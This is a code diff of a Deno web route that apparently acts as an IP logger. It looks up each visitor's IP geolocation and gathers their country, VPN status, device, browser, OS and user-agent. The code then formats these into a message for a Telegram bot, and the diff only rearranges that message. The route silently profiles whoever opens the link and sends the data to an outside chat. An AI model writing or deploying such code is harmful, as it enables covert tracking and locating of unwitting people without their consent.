@@ -15,14 +15,19 @@ router.get("/", async (ctx) => {
   const info = await ipapi(`${ip}`);
   const bot = `https://api.telegram.org/bot${Deno.env.get("TOKEN")}/sendMessage`
   const countryinfo = `**COUNTRY** : \`${info.country}\`` + await getEmojiByName(`flag-${info.countryCode}`.toLowerCase());
-  const cityInfo = `**CITY** : \[${info.city}\]\(https://www.google.com/maps/search/?api=1&query=${info.lat}%2C${info.lon}\)`
-  const iptext = `**IP** : \[${ip}\]\(https://ip2location.io/${ip}\)`
-  const vpn = `**VPN** : \`${info.proxy}\``
-  const device_v = `**DEVICE** : ${device.type}`
-  const device_os = `**SYSTEM** : ${os.name}`
-  const browser_v = `**BROWSER** : ${browser.name}`
   const userAgentString_v = `**userAgentString** : \`\`\`ts ${userAgentString}\`\`\``
-  const text = `${vpn}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${countryinfo}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${device_v}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${browser_v}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${device_os}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${userAgentString_v}`
+  const text = `${countryinfo}` +
+    `\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n` +
+    `**VPN** : \`${info.proxy}\`` +
+    `\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n` +
+    `**DEVICE** : ${device.type}` +
+    `\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n` +
+    `**BROWSER** : ${browser.name}` +
+    `\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n` +
+    `**SYSTEM** : ${os.name}` +
+    `\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n` +
+    `**userAgent** : \`\`\`json ${userAgentString}\`\`\``;
+  
   const button = {
     method: 'POST',
     headers: {
